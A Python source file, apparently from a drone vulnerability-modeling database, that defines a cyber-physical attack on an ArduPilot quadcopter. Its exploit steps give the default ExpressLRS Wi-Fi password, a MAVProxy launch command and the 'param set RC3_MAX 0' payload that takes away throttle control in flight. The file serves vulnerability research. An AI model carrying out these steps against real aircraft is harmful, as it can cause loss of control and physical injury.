from typing import List, Type

from saci.modeling import CPV
from saci.modeling.device import (
    GCS,
    Wifi,
    Telemetry,
    PWMChannel,
    ESC,
    MultiCopterMotor,
    Mavlink,
    ExpressLRSBackpack,
    Motor,
    Controller,
)
from saci.modeling.communication import ExternalInput
from saci.modeling.attack.base_attack_vector import BaseAttackVector
from saci.modeling.attack.packet_attack_signal import PacketAttackSignal
from saci.modeling.attack.base_attack_impact import BaseAttackImpact
from saci.modeling.state import GlobalState

from saci_db.vulns.wifi_knowncreds_vuln import WifiKnownCredsVuln
from ..vulns.mavlink_mitm_vuln import MavlinkMitmVuln
from saci_db.devices.ardupilot_quadcopter_device import ArduPilotController


class RC3ParameterManipulationCPV(CPV):
    NAME = "Parameter Manipulation via Network Interface"

    def __init__(self):
        super().__init__(
            
            required_components=[
                Wifi(), # This is the entry component (Required)
                Mavlink(), # This is a vulnerable required component (Required)
                Controller(), # Changed from PX4Controller() to Controller() for generalization (Required)
                # PWMChannel(), # Removed since the PWMChannel is just a passthrough for the CPV (Not Required)
                # ESC(), # Removed since the ESC is just a passthrough for the CPV (Not Required)
                Motor(), # This is the exit component + Changed to Motor() for generalization (Required)
            ],
            
            entry_component=Wifi(),
            exit_component=Motor(),
            
            vulnerabilities=[WifiKnownCredsVuln(), MavlinkMitmVuln()],
            
            initial_conditions={
                "Position": "Any",
                "Heading": "Any",
                "Speed": "Any (>0)",
                "Environment": "Any",
                "RemoteController": "On",
                "CPSController": "On",
                "OperatingMode": "STABILIZE",
            },
            
            attack_requirements=[
                "Computer with network access",
                "Local Wi-Fi access to target network",
                "Access to parameter configuration interface",
            ],
            
            attack_vectors=[
                BaseAttackVector(
                    name="Parameter Manipulation via Network Interface",
                    signal=PacketAttackSignal(
                        src=Wifi(), dst=Controller(), modality="network_packets"
                    ),
                    required_access_level="Remote",
                    configuration={
                        "payload": "param set RC3_MAX 0",
                        "protocol": "MAVLink",
                        "port": "14550",
                        "param_name": "RC3_MAX",
                        "param_value": "0",
                    },
                )
            ],
            
            attack_impacts=[
                BaseAttackImpact(
                    category="Loss of Control",
                    description="Manipulation of critical control parameters leads to loss of control and potential system failure.",
                )
            ],
            
            exploit_steps=[
                "TA1 Exploit Steps",
                    "Extract firmware from STM32H743 flight computer using EXPLODE tool",
                    "Analyze extracted firmware to confirm ArduPilot-based implementation",
                    "Verify firmware version against latest ArduPilot release",
                    "Document outdated components and potential vulnerabilities",
                    "Identify critical RC3 parameters (RC3_MAX, RC3_MIN, RC3_DZ)",
                    "Map parameter relationships and validation mechanisms",
                "TA2 Exploit Steps",
                    "Configure software-in-the-loop simulation environment",
                    "Test RC3 parameter manipulation in simulation",
                    "Verify segmentation fault when setting RC3_MAX=0",
                    "Document parameter impact on throttle control",
                    "Validate findings across different flight modes",
                    "Prepare test cases for hardware verification",
                "TA3 Exploit Steps",
                    "Turn on controller and drone system",
                    "Connect attacker system to ExpressLRS Wi-Fi (password: expresslrs)",
                    "Launch MAVProxy with command: mavproxy.py --master=udpout:10.0.0.1:14555 --master=udp:0.0.0.0:14550 --console",
                    "Record original RC3_MAX parameter value using 'param fetch RC3_MAX'",
                    "Disable drone safety (press black button for 2 seconds)",
                    "Arm drone (hold rudder bottom right)",
                    "Switch to 'Stabilize' mode using shoulder switch",
                    "Set throttle to mid-position and verify steady motor speed",
                    "Execute attack by setting 'param set RC3_MAX 0'",
                    "Verify throttle control loss and motor speed reduction",
                    "Test throttle non-responsiveness",
                    "Restore original RC3_MAX value",
                    "Return throttle to bottom position",
                    "Disarm drone (hold rudder bottom left)",
                    "Document all system responses and behaviors",
            ],
            
            associated_files=[],
            reference_urls=[
                "https://github.com/senpai-on-fire/owlet-taskboard/blob/main/CPVs/IVV_Feedback/PASS/HII-GS0409380007-CPV012.docx"
            ],
        )

    def in_goal_state(self, state: GlobalState):
        """
        Check if the attack has achieved its goal state.
        The goal is reached when:
        1. RC3_MAX parameter is set to 0
        2. Throttle control is non-responsive
        3. Motor RPM is insufficient for stable flight
        """
        # TODO: Implement specific checks for parameter values and motor state
        pass
